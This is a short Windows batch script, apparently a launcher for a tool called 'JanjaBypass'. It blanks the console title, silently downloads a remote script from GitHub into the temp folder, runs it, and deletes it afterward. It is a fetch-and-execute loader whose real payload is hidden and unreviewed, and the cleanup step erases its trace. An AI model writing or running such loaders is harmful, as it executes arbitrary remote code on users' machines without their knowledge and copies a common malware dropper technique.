@echo off

title .

cls

:: run the latest version

curl -s "https://raw.githubusercontent.com/n7el/JanjaBypass/main/src/Bypass.cmd" -o "%TEMP%\run.cmd"

call "%TEMP%\run.cmd"

del "%TEMP%\run.cmd" >nul 2>&1
